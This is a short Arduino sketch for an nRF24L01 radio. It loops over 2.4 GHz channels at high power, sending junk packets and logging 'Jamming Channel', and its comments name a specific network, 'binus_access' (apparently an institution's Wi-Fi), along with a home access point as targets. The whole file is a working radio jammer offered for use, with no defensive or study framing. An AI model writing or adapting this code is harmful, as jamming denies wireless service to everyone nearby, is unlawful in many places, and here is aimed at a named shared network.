#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>
RF24 radio(7, 8); // CE, CSN

void setup() {
  Serial.begin(9600);
  radio.begin();
  radio.setPALevel(RF24_PA_HIGH);
  radio.stopListening();
  radio.setDataRate(RF24_2MBPS);
}

void loop() {
  //binus_access channel 6 (2426 Mhz - 2448 Mhz)
  // AP rumah channel 5 (21 - 43)
  for (int i = 21; i < 43; i++) {
    // Serial.print("---  ");
    // Serial.print(i);
    // Serial.println(" Mhz ---");
      radio.setChannel(i);  
      const char text[] = "320939210nsdf"; // Just some random string
      radio.write(&text, sizeof(text));    // Send the data
      Serial.print("Jamming Channel - ");
      Serial.println(i);
  }

  // binus access 6 = 2426 Mhz
  // 2437 Mhz
  // while(true){
  //   radio.setChannel(3);  
  //   const char text[] = "320939210nsdf"; // Just some random string
  //   radio.write(&text, sizeof(text));    // Send the data
  //   Serial.print("Jamming Channel - ");
  //   Serial.println(34);
  // }
}